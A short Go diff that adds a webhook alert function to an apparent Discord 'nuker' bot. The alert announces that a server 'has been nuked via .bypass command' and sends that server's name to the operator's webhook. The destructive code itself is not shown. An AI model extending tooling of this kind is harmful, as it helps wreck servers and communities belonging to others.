@@ -52,6 +52,23 @@ func Logs(s *discordgo.Session, event *discordgo.GuildCreate) {
 
 }
 
+func LogsAlert(s *discordgo.Session, event *discordgo.GuildCreate) {
+	godotenv.Load()
+	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")
+
+	embed := discordgo.MessageEmbed{
+		Title: "Server " + fmt.Sprint(event.Name) + " has been nuked via ``.bypass`` command.",
+		Color: 00255,
+	}
+
+	data := &discordgo.WebhookParams{
+		Embeds: []*discordgo.MessageEmbed{&embed},
+	}
+	jsonData, _ := json.Marshal(data)
+
+	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
+}
+
 func InviteCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 	godotenv.Load()
 	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
